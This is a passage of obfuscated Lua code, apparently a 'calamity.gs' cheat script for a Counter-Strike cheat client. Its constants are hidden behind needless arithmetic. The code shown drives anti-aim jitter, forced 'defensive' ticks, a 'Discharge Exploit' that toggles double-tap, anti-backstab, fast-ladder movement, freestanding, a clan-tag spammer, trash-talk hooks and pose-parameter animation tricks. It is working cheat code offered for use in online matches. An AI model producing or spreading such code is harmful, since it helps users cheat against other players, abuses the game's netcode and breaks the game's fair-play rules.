+ 0 );v1147=1;end if (v1147==2) then if (v254.manualAA==(1244 -(157 + 1086))) then local v1231=0;while true do if ((1 -0)==v1231) then ui.set(v204.yaw[2], -(394 -304));break;end if (v1231==(0 -0)) then ui.set(v204.yawBase,"local view");ui.set(v204.yaw[1],"180");v1231=1;end end elseif (v254.manualAA==(2 -0)) then local v1271=819 -(599 + 220) ;while true do if ((1 -0)==v1271) then ui.set(v204.yaw[2],2021 -(1813 + 118) );break;end if (v1271==(0 + 0)) then ui.set(v204.yawBase,"local view");ui.set(v204.yaw[1218 -(841 + 376) ],"180");v1271=1 -0 ;end end elseif (v254.manualAA==3) then local v1297=0 + 0 ;while true do if (v1297==0) then ui.set(v204.yawBase,"local view");ui.set(v204.yaw[2 -1 ],"180");v1297=860 -(464 + 395) ;end if (v1297==(2 -1)) then ui.set(v204.yaw[1 + 1 ],1017 -(467 + 370) );break;end end end break;end end elseif ( not v629 and ui.get(v225[v205.pState].enableState)) then if (ui.get(v225[v205.pState].yawJitter)=="3-Way") then local v1213=0 -0 ;while true do if ((0 + 0)==v1213) then ui.set(v204.yawJitter[3 -2 ],"Center");ui.set(v204.yawJitter[1 + 1 ],((v628==1) and (ui.get(v225[v205.pState].yawJitterLeft) * math.random( -1,2 -1 ))) or (ui.get(v225[v205.pState].yawJitterRight) * math.random( -(521 -(150 + 370)),1283 -(74 + 1208) )) );break;end end elseif (ui.get(v225[v205.pState].yawJitter)=="L & R") then ui.set(v204.yawJitter[2 -1 ],"Center");ui.set(v204.yawJitter[9 -7 ],((v628==1) and ui.get(v225[v205.pState].yawJitterLeft)) or ui.get(v225[v205.pState].yawJitterRight) );else ui.set(v204.yawJitter[1 + 0 ],ui.get(v225[v205.pState].yawJitter));ui.set(v204.yawJitter[392 -(14 + 376) ],ui.get(v225[v205.pState].yawJitterStatic));end if (ui.get(v225[v205.pState].yawCondition)=="L & R") then ui.set(v204.bodyYaw[1 -0 ],"Jitter");ui.set(v204.bodyYaw[2 + 0 ], -(1 + 0));else ui.set(v204.bodyYaw[1 + 0 ],"Static");ui.set(v204.bodyYaw[5 -3 ], -(136 + 44));end if (v254.manualAA==1) then ui.set(v204.yawBase,"local view");ui.set(v204.yaw[79 -(23 + 55) ],"180");ui.set(v204.yaw[4 -2 ], -90);elseif (v254.manualAA==(2 + 0)) then local v1260=0 + 0 ;while true do if (v1260==0) then ui.set(v204.yawBase,"local view");ui.set(v204.yaw[1 -0 ],"180");v1260=1 + 0 ;end if (v1260==1) then ui.set(v204.yaw[2],90);break;end end elseif (v254.manualAA==3) then local v1284=901 -(652 + 249) ;while true do if (v1284==(2 -1)) then ui.set(v204.yaw[2],2048 -(708 + 1160) );break;end if (v1284==(0 -0)) then ui.set(v204.yawBase,"local view");ui.set(v204.yaw[1 -0 ],"180");v1284=1;end end end end else v254.ignore=false;end elseif (v254.input>globals.curtime()) then v254.input=globals.curtime();end local v630=false;local v631=false;local v632=entity.get_players(true);for v845=28 -(10 + 17) , #v632 do if entity.is_dormant(v632[v845]) then local v1011=0 + 0 ;while true do if (1==v1011) then return;end if (v1011==(1732 -(1400 + 332))) then heightAlert=false;sidewaysAlert=false;v1011=1 -0 ;end end end local v846,v847,v848=entity.get_prop(v632[v845],"m_vecOrigin");local v849=entity.get_prop(v632[v845],"m_fFlags");local v850=v6.band(v849,1909 -(242 + 1666) )~=0 ;local v851=math.sqrt(((v846-v605.x)^(1 + 1)) + ((v847-v605.y)^(1 + 1)) + ((v848-v605.z)^(2 + 0)) );if (((v848 + (1040 -(850 + 90)))<v605.z) and (v851<=(525 -225))) then v630=true;else v630=false;end if (((v612>=(1430 -(360 + 1030))) or (v612<= -(36 + 4))) and v212.headVisible(v632[v845])) then v631=true;else v631=false;end end if ui.get(v225[v205.pState].enableState) then local v926=ui.get(v204.dt[1]) and ui.get(v204.dt[5 -3 ]) ;if ((ui.get(v225[v205.pState].defensiveOpt)=="Always on") and v926) then v600.force_defensive=true;end if (v600.chokedcommands>1) then v600.allow_send_packet=false;else v600.allow_send_packet=true;end if ((ui.get(v225[v205.pState].defensiveOpt)=="Elusive mode") and v926) then local v1071=0 -0 ;while true do if (v1071==0) then ui.set(v204.dt[3],"Defensive");if ((v627%(1664 -(909 + 752)))==(1224 -(109 + 1114))) then ui.set(v204.dt[5 -2 ],"Offensive");end v1071=1;end if (v1071==1) then v600.force_defensive=(v627%3)~=(1 + 0) ;break;end end end if ((ui.get(v225[v205.pState].defensiveOpt)=="Always on Tick") and v926) then if ((v627%ui.get(v225[v205.pState].defensiveOptSlider))==(243 -(6 + 236))) then v600.force_defensive=true;end end if v254.ignore then return;end local v927=v212.includes(ui.get(v224.aaTab.freestandDisablers),"Manual") and ((v254.manualAA==(2 + 0)) or (v254.manualAA==(1 + 0))) ;if ((ui.get(v225[v205.pState].defensivePitch)=="Custom") and v618 and v926 and  not v927) then ui.set(v204.pitch[1],"Custom");ui.set(v204.pitch[2],ui.get(v225[v205.pState].defensivePitchSlider));elseif ((ui.get(v225[v205.pState].defensivePitch)=="Random") and v618 and v926 and  not v927) then local v1149=0 -0 ;while true do if (v1149==(0 -0)) then ui.set(v204.pitch[1],"Custom");ui.set(v204.pitch[1135 -(1076 + 57) ],math.random( -89,15 + 74 ));break;end end elseif ((ui.get(v225[v205.pState].defensivePitch)=="Jitter") and v618 and v926 and  not v927) then local v1178=0;while true do if (v1178==0) then ui.set(v204.pitch[1],"Custom");if v205.switch3 then ui.set(v204.pitch[691 -(579 + 110) ],(v205.switch2 and ui.get(v225[v205.pState].defensivePitchSlider)) or ui.get(v225[v205.pState].defensivePitchSlider2) );else ui.set(v204.pitch[2],(v205.switch2 and ui.get(v225[v205.pState].defensivePitchSlider2)) or ui.get(v225[v205.pState].defensivePitchSlider) );end break;end end else local v1179=0;while true do if (v1179==(0 + 0)) then ui.set(v204.pitch[1 + 0 ],ui.get(v225[v205.pState].pitch));ui.set(v204.pitch[2],ui.get(v225[v205.pState].pitchSlider));break;end end end ui.set(v204.yawBase,ui.get(v225[v205.pState].yawBase));ui.set(v204.yaw[1],ui.get(v225[v205.pState].yaw));if ((ui.get(v225[v205.pState].defensiveYaw)=="Random") and v618 and v926) then local v1072=0 + 0 ;local v1073;while true do if ((407 -(174 + 233))==v1072) then v1073=client.random_int( -(502 -322),180);ui.set(v204.yaw[3 -1 ],v1073);v1072=1 + 0 ;end if (v1072==1) then ui.set(v204.yawJitter[1],"Off");ui.set(v204.yawJitter[1176 -(663 + 511) ],0 + 0 );break;end end elseif ((ui.get(v225[v205.pState].defensiveYaw)=="Side-ways") and v618 and v926) then local v1150=0;while true do if (v1150==(0 + 0)) then ui.set(v204.yaw[5 -3 ],(v205.switch2 and  -(61 + 39)) or (235 -135) );ui.set(v204.yawJitter[2 -1 ],"Off");v1150=1 + 0 ;end if (v1150==1) then ui.set(v204.yawJitter[3 -1 ],0 + 0 );break;end end elseif ((ui.get(v225[v205.pState].defensiveYaw)=="Flick") and v618 and v926) then local v1180=0 + 0 ;while true do if (v1180==(723 -(478 + 244))) then ui.set(v204.yawJitter[519 -(440 + 77) ],0);break;end if (v1180==0) then ui.set(v204.yaw[2],41 + 49 );ui.set(v204.yawJitter[3 -2 ],"Off");v1180=1557 -(655 + 901) ;end end elseif ((ui.get(v225[v205.pState].defensiveYaw)=="Spin") and v618 and v926) then local v1214=0;while true do if (1==v1214) then ui.set(v204.yawJitter[1],"Off");ui.set(v204.yawJitter[2],0 + 0 );break;end if (v1214==(0 + 0)) then ui.set(v204.yaw[1],"Spin");ui.set(v204.yaw[2 + 0 ],ui.get(v225[v205.pState].defensiveYawSlider2));v1214=1;end end elseif ((ui.get(v225[v205.pState].defensiveYaw)=="Backward Jitter") and v618 and v926 and  not v927) then local v1261=0 -0 ;while true do if ((1445 -(695 + 750))==v1261) then ui.set(v204.yaw[6 -4 ],(v205.switch2 and  -(231 -81)) or (603 -453) );ui.set(v204.yawJitter[352 -(285 + 66) ],"Off");v1261=1;end if (v1261==(2 -1)) then ui.set(v204.yawJitter[2],1310 -(682 + 628) );break;end end elseif ((ui.get(v225[v205.pState].defensiveYaw)=="Custom") and v618 and v926) then ui.set(v204.yaw[2],ui.get(v225[v205.pState].defensiveYawSlider));elseif (ui.get(v225[v205.pState].yawCondition)=="L & R") then ui.set(v204.yaw[1 + 1 ],((v628==1) and ui.get(v225[v205.pState].yawLeft)) or ui.get(v225[v205.pState].yawRight) );elseif (ui.get(v225[v205.pState].yawCondition)=="Slow Jitter") then local v1310=0;while true do if (1==v1310) then ui.set(v204.bodyYaw[301 -(176 + 123) ],(v205.switch and  -(26 + 34)) or (44 + 16) );break;end if (v1310==(269 -(239 + 30))) then ui.set(v204.yaw[1],"180");ui.set(v204.yaw[2],((v628==1) and ui.get(v225[v205.pState].yawLeft)) or ui.get(v225[v205.pState].yawRight) );v1310=1 + 0 ;end end elseif (ui.get(v225[v205.pState].yawCondition)=="Static") then ui.set(v204.yaw[2],ui.get(v225[v205.pState].yawStatic));end local v928=false;if ((v212.includes(ui.get(v225[v205.pState].yawJitterDisablers),"Height advantage") and v630) or (v212.includes(ui.get(v225[v205.pState].yawJitterDisablers),"Head safety") and v631)) then ui.set(v204.yawJitter[1],"Off");elseif (ui.get(v225[v205.pState].yawJitter)=="3-Way") then ui.set(v204.yawJitter[1 + 0 ],"Center");else ui.set(v204.yawJitter[1 -0 ],ui.get(v225[v205.pState].yawJitter));end if (ui.get(v225[v205.pState].yawJitterCondition)=="L & R") then if (ui.get(v225[v205.pState].yawJitter)=="3-Way") then ui.set(v204.yawJitter[5 -3 ],((v628==1) and (ui.get(v225[v205.pState].yawJitterLeft) * math.random( -(316 -(306 + 9)),3 -2 ))) or (ui.get(v225[v205.pState].yawJitterRight) * math.random( -(1 + 0),1 + 0 )) );elseif (ui.get(v225[v205.pState].yawJitter)=="Slow Jitter") then ui.set(v204.yaw[1 + 1 ],(v928 and ui.get(v225[v205.pState].yawJitterRight)) or ui.get(v225[v205.pState].yawJitterLeft) );else ui.set(v204.yawJitter[2],((v628==(2 -1)) and ui.get(v225[v205.pState].yawJitterLeft)) or ui.get(v225[v205.pState].yawJitterRight) );end elseif (ui.get(v225[v205.pState].yawJitter)=="3-Way") then ui.set(v204.yawJitter[1377 -(1140 + 235) ],ui.get(v225[v205.pState].yawJitterStatic) * math.random( -1,1 + 0 ) );elseif (ui.get(v225[v205.pState].yawJitter)=="Slow Jitter") then ui.set(v204.yaw[2],(v928 and ui.get(v225[v205.pState].yawJitterStatic)) or  -ui.get(v225[v205.pState].yawJitterStatic) );else ui.set(v204.yawJitter[2 + 0 ],ui.get(v225[v205.pState].yawJitterStatic));end local v929=entity.get_local_player();local v930,v931,v932=entity.get_prop(v929,"m_vecVelocity");local v933=math.sqrt((v930^(1 + 1)) + (v931^(54 -(33 + 19))) )<(2 + 3) ;local v926=ui.get(v204.dt[1]) and ui.get(v204.dt[5 -3 ]) ;local v934=ui.get(v204.os[1 + 0 ]) and ui.get(v204.os[2]) ;local v935=ui.get(v204.fakeDuck);if (ui.get(v225[v205.pState].yawCondition)=="Slow Jitter") then if  not v935 then if (v926 or v934) then ui.set(v204.bodyYaw[1 -0 ],"Static");else ui.set(v204.bodyYaw[1 + 0 ],"Jitter");ui.set(v204.bodyYaw[691 -(586 + 103) ], -(1 + 0));end else local v1151=0;while true do if (v1151==(0 -0)) then ui.set(v204.bodyYaw[1],"Jitter");ui.set(v204.bodyYaw[1490 -(1309 + 179) ], -(1 -0));break;end end end else ui.set(v204.bodyYaw[1 + 0 ],ui.get(v225[v205.pState].bodyYaw));ui.set(v204.bodyYaw[5 -3 ],ui.get(v225[v205.pState].bodyYawSlider));end if (reversed and ui.get(v225[v205.pState].antiBruteSet)) then ui.set(v204.yaw[2],angle);end ui.set(v204.fsBodyYaw,false);elseif  not ui.get(v225[v205.pState].enableState) then local v1074=0;while true do if (v1074==(3 + 0)) then ui.set(v204.edgeYaw,false);ui.set(v204.roll,0);break;end if (2==v1074) then ui.set(v204.bodyYaw[1 -0 ],"Off");ui.set(v204.bodyYaw[3 -1 ],0);ui.set(v204.fsBodyYaw,false);v1074=612 -(295 + 314) ;end if ((2 -1)==v1074) then ui.set(v204.yaw[1964 -(1300 + 662) ],0);ui.set(v204.yawJitter[1],"Off");ui.set(v204.yawJitter[2],0 -0 );v1074=1757 -(1178 + 577) ;end if (v1074==(0 + 0)) then ui.set(v204.pitch[2 -1 ],"Off");ui.set(v204.yawBase,"Local view");ui.set(v204.yaw[1406 -(851 + 554) ],"Off");v1074=1 + 0 ;end end end if v212.includes(ui.get(v224.aaTab.aamenushka),"Safe Knife") then if ((entity.get_classname(entity.get_player_weapon(entity.get_local_player()))=="CKnife") and (v205.pState==7)) then ui.set(v204.pitch[1],"Default");ui.set(v204.yawBase,"At targets");ui.set(v204.yaw[2 -1 ],"180");ui.set(v204.yaw[3 -1 ],302 -(115 + 187) );ui.set(v204.yawJitter[1 + 0 ],"Off");ui.set(v204.yawJitter[2],0);ui.set(v204.bodyYaw[1 + 0 ],"Static");ui.set(v204.bodyYaw[7 -5 ],0);ui.set(v204.fsBodyYaw,false);ui.set(v204.edgeYaw,false);ui.set(v204.roll,0);end end if v212.includes(ui.get(v224.aaTab.aamenushka),"Adjust fakelag limit") then if (v614 and  not v616 and  not v615) then local v1075=0;while true do if (v1075==(1161 -(160 + 1001))) then if  not hsSaved then local v1194=0;while true do if (v1194==(0 + 0)) then hsValue=ui.get(v204.fakeLag[1]);hsSaved=true;break;end end end ui.set(v204.fakeLag[1],1 + 0 );break;end end elseif hsSaved then ui.set(v204.fakeLag[1 -0 ],hsValue);hsSaved=false;end end distance_knife={};distance_knife.anti_knife_dist=function(v852,v853,v854,v855,v856,v857) return math.sqrt(((v855-v852)^(360 -(237 + 121))) + ((v856-v853)^(899 -(525 + 372))) + ((v857-v854)^(3 -1)) );end;if v212.includes(ui.get(v224.aaTab.aamenushka),"Avoid~Backstab") then local v936=entity.get_players(true);local v937,v938,v939=entity.get_prop(entity.get_local_player(),"m_vecOrigin");if (v936==nil) then return;end for v1012=3 -2 , #v936 do local v1013,v1014,v1015=entity.get_prop(v936[v1012],"m_vecOrigin");local v1016=distance_knife.anti_knife_dist(v937,v938,v939,v1013,v1014,v1015);local v1017=entity.get_player_weapon(v936[v1012]);if ((entity.get_classname(v1017)=="CKnife") and (v1016<=200)) then ui.set(v204.yaw[2],180);ui.set(v204.yawBase,"At targets");end end end if ui.get(v224.miscTab.fastLadderEnabled) then local v940,v941=client.camera_angles();if (entity.get_prop(v205.localPlayer,"m_MoveType")==9) then v600.yaw=math.floor(v600.yaw + (142.5 -(96 + 46)) );v600.roll=777 -(643 + 134) ;if v212.includes(ui.get(v224.miscTab.fastLadder),"Up") then if (v600.forwardmove>0) then if (v940<45) then v600.pitch=89;v600.in_moveright=1 + 0 ;v600.in_moveleft=0 -0 ;v600.in_forward=0 -0 ;v600.in_back=1 + 0 ;if (v600.sidemove==0) then v600.yaw=v600.yaw + (176 -86) ;end if (v600.sidemove<(0 -0)) then v600.yaw=v600.yaw + (869 -(316 + 403)) ;end if (v600.sidemove>(0 + 0)) then v600.yaw=v600.yaw + 30 ;end end end end if v212.includes(ui.get(v224.miscTab.fastLadder),"Down") then if (v600.forwardmove<0) then local v1181=0;while true do if (v1181==(0 -0)) then v600.pitch=33 + 56 ;v600.in_moveleft=2 -1 ;v1181=1;end if (v1181==(1 + 0)) then v600.in_moveright=0;v600.in_forward=1 + 0 ;v1181=6 -4 ;end if (v1181==(14 -11)) then if (v600.sidemove>0) then v600.yaw=v600.yaw + 150 ;end if (v600.sidemove<(0 -0)) then v600.yaw=v600.yaw + 2 + 28 ;end break;end if (v1181==2) then v600.in_back=0;if (v600.sidemove==(0 -0)) then v600.yaw=v600.yaw + 90 ;end v1181=1 + 2 ;end end end end end end if v212.includes(ui.get(v224.aaTab.aamenushka),"Edge Yaw") then ui.set(v204.edgeYaw,ui.get(v224.aaTab.edgeYawHotkey));else ui.set(v204.edgeYaw,false);end end);client.set_event_callback("setup_command",function(v634) local v635=0 -0 ;local v636;local v637;local v638;while true do if (v635==(17 -(12 + 5))) then v636=v12.get_local_player();v637=v636:get_prop("m_fFlags");v635=1;end if (v635==(3 -2)) then v638=v6.band(v637,1 -0 )~=(0 -0) ;if (v212.includes(ui.get(v224.aaTab.aamenushka),"Discharge Exploit") and  not v638) then local v1113=0 -0 ;local v1114;local v1115;local v1116;while true do if (v1113==0) then if (dtEnabled==nil) then dtEnabled=true;end v1114=entity.get_players(true);v1113=1 + 0 ;end if (v1113==(1975 -(1656 + 317))) then for v1195=1 + 0 , #v1114 do local v1196=v1114[v1195];local v1197,v1198,v1199=entity.hitbox_position(v1196,1 + 0 );if client.visible(v1197,v1198,v1199 + (53 -33) ) then v1115=true;end end if v1115 then local v1220=0 -0 ;while true do if (v1220==(354 -(5 + 349))) then ui.set(v204.dt[4 -3 ],false);client.delay_call(0.01,function() ui.set(v204.dt[1272 -(266 + 1005) ],true);end);break;end end end break;end if (v1113==1) then v1115=false;v1116=entity.get_prop(v205.localPlayer,"m_iHealth");v1113=2 + 0 ;end end elseif (dtEnabled==true) then local v1160=0 -0 ;while true do if (v1160==0) then ui.set(v204.dt[1 -0 ],dtEnabled);dtEnabled=false;break;end end end break;end end end);client.set_event_callback("setup_command",function(v639) local v640=1696 -(561 + 1135) ;local v641;local v642;local v643;local v644;local v645;local v646;local v647;local v648;while true do if (v640==(0 -0)) then v641=entity.get_prop(v205.localPlayer,"m_fFlags");v642=(v6.band(v641,3 -2 )~=0) and (v639.in_jump==0) ;v640=1067 -(507 + 559) ;end if (v640==(7 -4)) then v647=v212.includes(ui.get(v224.aaTab.freestandDisablers),"Manual") and ((v254.manualAA==2) or (v254.manualAA==(3 -2))) and v254.ignore ;v648=v644 or v645 or v646 or v647 ;v640=392 -(212 + 176) ;end if (v640==4) then if (ui.get(v224.aaTab.freestandHotkey) and  not v648 and v212.includes(ui.get(v224.aaTab.aamenushka),"Freestand")) then v205.fs=true;ui.set(v204.pitch[906 -(250 + 655) ],ui.get(v225[v205.pState].pitch));ui.set(v204.pitch[5 -3 ],ui.get(v225[v205.pState].pitchSlider));ui.set(v204.freeStand[2 -0 ],"Always on");ui.set(v204.freeStand[1 -0 ],true);else v205.fs=false;ui.set(v204.freeStand[1],false);ui.set(v204.freeStand[1958 -(1869 + 87) ],"On hotkey");end break;end if (v640==(6 -4)) then v645=v212.includes(ui.get(v224.aaTab.freestandDisablers),"Duck") and (entity.get_prop(v205.localPlayer,"m_flDuckAmount")>(1901.1 -(484 + 1417))) ;v646=v212.includes(ui.get(v224.aaTab.freestandDisablers),"Slowmo") and v643 ;v640=3;end if (v640==1) then v643=ui.get(v204.slow[2 -1 ]) and ui.get(v204.slow[2 -0 ]) ;v644=v212.includes(ui.get(v224.aaTab.freestandDisablers),"Air") and  not v642 ;v640=775 -(48 + 725) ;end end end);client.set_event_callback("setup_command",function(v649) local v650=0 -0 ;local v651;local v652;local v653;local v654;local v655;local v656;local v657;local v658;local v659;local v660;while true do if (v650==(7 -4)) then v658=v3(client.eye_position());v659,v660=client.trace_line(v205.localPlayer,v658.x,v658.y,v658.z,v658.x + (v657.x * (4761 + 3431)) ,v658.y + (v657.y * (21892 -13700)) ,v658.z + (v657.z * (2293 + 5899)) );v651=true;v650=2 + 2 ;end if (1==v650) then if (entity.get_classname(entity.get_player_weapon(v205.localPlayer))=="CC4") then v205.should_disable=true;return;end v653=entity.get_all("CPlantedC4")[854 -(152 + 701) ];v654={"CWorld","CCSPlayer","CFuncBrush","CPropDoorRotating","CHostage"};v650=5 -3 ;end if (v650==(0 -0)) then v651=true;v652=false;v205.should_disable=false;v650=2 -1 ;end if ((8 -4)==v650) then if ((v660~=nil) and (v660~= -1)) then for v1152=801 -(499 + 302) , #v654 do if (entity.get_classname(v660)==v654[v1152]) then v651=false;end end end if ( not v205.should_disable and client.key_state(935 -(39 + 827) ) and  not v651 and  not v652 and ui.get(v225[21 -13 ].enableState)) then v649.in_use=0;if ui.get(v224.aaTab.freestandHotkey) then local v1161=0 -0 ;while true do if (v1161==1) then ui.set(v204.freeStand[7 -5 ],"On hotkey");break;end if (v1161==0) then v205.fs=false;ui.set(v204.freeStand[1 -0 ],false);v1161=1;end end end end break;end if ((1 + 1)==v650) then if (v653~=nil) then local v1121=v3(entity.get_origin(v205.localPlayer)):dist(v3(entity.get_origin(v653)));if ((v1121<=64) and (entity.get_prop(v205.localPlayer,"m_iTeamNum")==(8 -5))) then local v1162=0 + 0 ;while true do if (v1162==(0 -0)) then v205.should_disable=true;v652=true;break;end end end end v655,v656=client.camera_angles();v657=v3(v212.vec_angles(v655,v656));v650=3;end end end);local function v260() if v212.includes(ui.get(v224.miscTab.miscmenushka),"Clantag") then local v942=104 -(103 + 1) ;local v943;while true do if (v942==(556 -(475 + 79))) then v255.enb=true;break;end if (0==v942) then if ui.get(ui.reference("Misc","Miscellaneous","Clan tag spammer")) then return;end v943=v213("calamity.gs ",{0 -0 ,1 + 0 ,1505 -(1395 + 108) ,3,1208 -(7 + 1197) ,3 + 2 ,3 + 3 ,7,8,328 -(27 + 292) ,12 -2 ,21 -10 ,150 -(43 + 96) ,44 -33 ,24 -13 ,11,21 -10 ,20 -9 ,1 + 10 ,12,13,36 -22 ,44 -29 ,16,17,15 + 3 ,14 + 5 ,18 + 2 ,17 + 4 ,22,23,2 + 22 });v942=1 + 0 ;end if (v942==(1302 -(384 + 917))) then if (entity.get_prop(entity.get_game_rules(),"m_gamePhase")==5) then local v1163=0;while true do if (v1163==0) then v943=v213("calamity.gs ",{1549 -(1407 + 136) });client.set_clan_tag(v943);break;end end elseif (entity.get_prop(entity.get_game_rules(),"m_timeUntilNextPhaseStarts")~=(1887 -(687 + 1200))) then local v1200=1710 -(556 + 1154) ;while true do if (v1200==(0 -0)) then v943=v213("calamity.gs ",{106 -(9 + 86) });client.set_clan_tag(v943);break;end end elseif (v943~=v255.prev_ct) then client.set_clan_tag(v943);end v255.prev_ct=v943;v942=423 -(275 + 146) ;end end elseif (v255.enb==true) then client.set_clan_tag(v256());v255.enb=false;end end v255.paint=function() if (entity.get_local_player()~=nil) then if ((globals.tickcount()%(1 + 1))==(64 -(29 + 35))) then v260();end end end;v255.run_command=function(v661) if (entity.get_local_player()~=nil) then if (v661.chokedcommands==(0 -0)) then v260();end end end;v255.player_connect_full=function(v662) if (client.userid_to_entindex(v662.userid)==entity.get_local_player()) then v255.orig_ct=v256();end end;v255.shutdown=function() client.set_clan_tag(v256());end;client.set_event_callback("paint",v255.paint);client.set_event_callback("run_command",v255.run_command);client.set_event_callback("player_connect_full",v255.player_connect_full);client.set_event_callback("shutdown",v255.shutdown);ui.set_callback(v224.miscTab.trashTalk,function() local v663=(menushka and client.set_event_callback) or client.unset_event_callback ;v663("player_death",v214);end);client.set_event_callback("aim_miss",v253);client.set_event_callback("aim_hit",v252);client.set_event_callback("player_death",function(v664) local v665,v666=v664.userid,v664.attacker;local v667=client.userid_to_entindex(v665);if (v667~=entity.get_local_player()) then return;end client.delay_call(2 -1 ,v251.clear);end);client.set_event_callback("player_connect_full",function(v668) if (client.userid_to_entindex(v668.userid)==entity.get_local_player()) then v251.clear();end end);local v265={[4 -3 ]="Off",[2 + 0 ]="Always slide",[1015 -(53 + 959) ]="Never slide"};local v266=408 -(312 + 96) ;client.set_event_callback("setup_command",function(v669) local v670=0 -0 ;local v671;local v672;while true do if (v670==(286 -(147 + 138))) then v672=v669.in_jump==0 ;if v212.includes(ui.get(v224.miscTab.animations),"Leg fucker") then if v212.includes(ui.get(v224.miscTab.animations),"Leg fucker") then ui.set(v204.legMovement,(((v669.command_number%(902 -(813 + 86)))==0) and "Off") or "Always slide" );end end break;end if (0==v670) then v671=entity.get_local_player();if  not v671 then return;end v670=1 + 0 ;end end end);client.set_event_callback("pre_render",function() local v673=entity.get_local_player();if  not v673 then return;end if (ui.get(v224.miscTab.animationsEnabled)==false) then return;end local v674=entity.get_prop(v673,"m_fFlags");v266=((v6.band(v674,1)==(0 -0)) and 0) or ((v266<(497 -(18 + 474))) and (v266 + 1)) or v266 ;if v212.includes(ui.get(v224.miscTab.animations),"Backward Legs") then entity.set_prop(v673,"m_flPoseParameter",1 + 0 ,0);end if (v212.includes(ui.get(v224.miscTab.animations),"In air") and (v6.band(v674,3 -2 )==0)) then entity.set_prop(v673,"m_flPoseParameter",1087 -(860 + 226) ,6);end if v212.includes(ui.get(v224.miscTab.animations),"Leg fucker") then entity.set_prop(v673,"m_flPoseParameter",1,(((globals.tickcount()%(307 -(121 + 182)))>(1 + 0)) and ((1245 -(988 + 252))/(2 + 8))) or (1 + 0) );end if v212.includes(ui.get(v224.miscTab.animations),"0 Pitch on land") then local v945=1970 -(49 + 1921) ;while true do if (v945==(890 -(223 + 667))) then v266=((v6.band(v674,53 -(51 + 1) )==(1 -0)) and (v266 + 1)) or (0 -0) ;if ((v266>(1145 -(146 + 979))) and (v266<(43 + 107))) then entity.set_prop(v673,"m_flPoseParameter",605.5 -(311 + 294) ,12);end break;end end end if v212.includes(ui.get(v224.miscTab.animations),"Moonwalking") then local v946=0 -0 ;while true do if (v946==(0 + 0)) then entity.set_prop(v673,"m_flPoseParameter",1444 -(496 + 947) ,7);ui.set(v204.legMovement,"Never slide");break;end end end if v212.includes(ui.get(v224.miscTab.animations),"Earthquake") then local v947=1358 -(1233 + 125) ;while true do if (v947==(1 + 0)) then entity.set_prop(entity.get_local_player(),"m_flPoseParameter",math.random(0 + 0 ,1 + 4 )/(1647 -(963 + 682)) ,6 + 0 );break;end if (v947==(1504 -(504 + 1000))) then entity.set_prop(entity.get_local_player(),"m_flPoseParameter",math.random(0 + 0 ,5 + 0 )/(1 + 1) ,2 -0 );entity.set_prop(entity.get_local_player(),"m_flPoseParameter",math.random(0 + 0 ,5)/(2 + 0) ,4);v947=183 -(156 + 26) ;end end end if v212.includes(ui.get(v224.miscTab.animations),"Walking in Air") then if (entity.get_prop(v205.localPlayer,"m_MoveType")~=(6 + 3)) then local v1079=0 -0 ;local v1080;local v1081;local v1082;while true do if (v1079==0) then v1080=v12.get_local_player();v1081=v1080:get_prop("m_fFlags");v1079=165 -(149 + 15) ;end if (v1079==(961 -(890 + 70))) then v1082=v6.band(v1081,118 -(39 + 78) )~=0 ;if  not v1082 then local v1201=482 -(14 + 468) ;local v1202;while true do if (1==v1201) then entity.set_prop(v1080,"m_flPoseParameter",2 -1 ,16 -10 );break;end if (v1201==(0 + 0)) then v1202=v1080:get_anim_overlay(4 + 2 );v1202.weight=1 + 0 ;v1201=1 + 0 ;end end end break;end end end end if v212.includes(ui.get(v224.miscTab.animations),"Freezed legs") then entity.set_prop(v673,"m_flPoseParameter",0,3 + 5 );entity.set_prop(v673,"m_flPoseParameter",0 -0 ,9 + 0 );entity.set_prop(v673,"m_flPoseParameter",0 -0 ,1 + 9 );end end);local v267=0;local v268=51 -(12 + 39) ;local v269=1 + 0 ;local v270=0 -0 ;local v271=0;local v272=0 -0 ;local v273=0 + 0 ;local v274=0 + 0 ;local v275=0 -0 ;local v276=0 + 0 ;local v267=0 -0 ;local v268=0;local v277={y=1710 -(1596 + 114) };local v278={y=0 -0 };local v279={r=713 -(164 + 549) ,g=1438 -(1059 + 379) ,b=0 -0 ,a=0};local v280={r=0 + 0 ,g=0,b=0 + 0 ,a=392 -(145 + 247) };local v281={r=0,g=0 + 0 ,b=0 + 0 ,a=0 -0 };local v282={w=0,x=0 + 0 ,y=22 + 3 };local v283={r=0,g=0,b=0 -0 ,a=0};local v284={w=0,x=720 -(254 + 466) ,y=585 -(544 + 16) };local v285={w=0 -0 ,x=628 -(294 + 334) ,y=25,a=253 -(236 + 17) };local v286={w=0 + 0 ,x=0,y=25,a=0};local v287={w=0 + 0 ,x=0 -0 ,y=25,a=0};local v288={w=0 -0 ,x=0 + 0 ,y=25,a=0 + 0 };local v289={w=794 -(413 + 381) ,x=0 + 0 ,y=25,a=0 -0 };local v290={w=0 -0 ,x=0,y=1995 -(582 + 1388) ,a=0 -0 };local v291={w=0 + 0 ,x=364 -(326 + 38) ,y=73 -48 };local v292=0 -0 ;local v293=620 -(47 + 573) ;local v294=false;local v295=false;local v296=0 + 0 ;local v297=191 -146 ;local v298=0 -0 ;local v299=1664 -(1269 + 395) ;local v300=492 -(76 + 416) ;local v301=45;local v302=443 -(319 + 124) ;local v303=0 -0 ;local v304=0;local v305=1052 -(564 + 443) ;local v306=0 -0 ;local v307=0;local v308=458 -(337 + 121) ;local v309=0;local v310=0;local v311=0 -0 ;local v312=0 -0 ;local v313=1911 -(1261 + 650) ;local v314=0 + 0 ;local v315={};v315.lerp=function(v675,v676,v677) return v675 + ((v676-v675) * v677) ;end;client.set_event_callback("paint",function() local v678=entity.get_local_player();if ((v678==nil) or (entity.is_alive(v678)==false)) then return;end local v679,v680=client.screen_size();local v681=entity.get_player_weapon(v678);local v682=(entity.get_prop(v678,"m_flPoseParameter",17 -6 ) * 120) -(1877 -(772 + 1045)) ;local v683=((v682>(0 + 0)) and (145 -(102 + 42))) or  -(1845 -(1524 + 320)) ;local v684=v205.intToS[v205.pState]:upper();local v685={};v685.r,v685.g,v685.b,v685.a=ui.get(v224.visualsTab.indicatorsClr);local v690={};v690.r,v690.g,v690.b,v690.a=ui.get(v224.visualsTab.arrowClr);local v695=math.floor(v8.get_desync(1271 -(1049 + 221) ));local v696=156 -(18 + 138) ;if (ui.get(v224.visualsTab.watermarkMenu)=="calamity") then v696=v696 + 1 ;v292=v212.lerp(v292,624 -369 ,globals.frametime() * (1105 -(67 + 1035)) );else v292=v212.lerp(v292,0,globals.frametime() * 11 );end local 